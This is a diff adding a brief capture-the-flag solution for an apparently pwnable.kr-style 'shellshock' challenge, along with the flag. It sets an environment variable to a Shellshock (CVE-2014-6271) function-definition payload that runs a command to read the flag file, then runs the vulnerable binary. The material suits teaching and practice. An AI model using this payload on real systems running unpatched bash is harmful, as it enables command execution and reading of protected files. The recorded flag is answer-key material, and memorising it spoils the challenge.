@@ -1,0 +1,6 @@
+SOLUTION:
+	export x='() { :;}; /bin/cat /home/shellshock/flag'
+	./shellshock
+FLAG:
+only if I knew CVE-2014-6271 ten years ago..!!
+
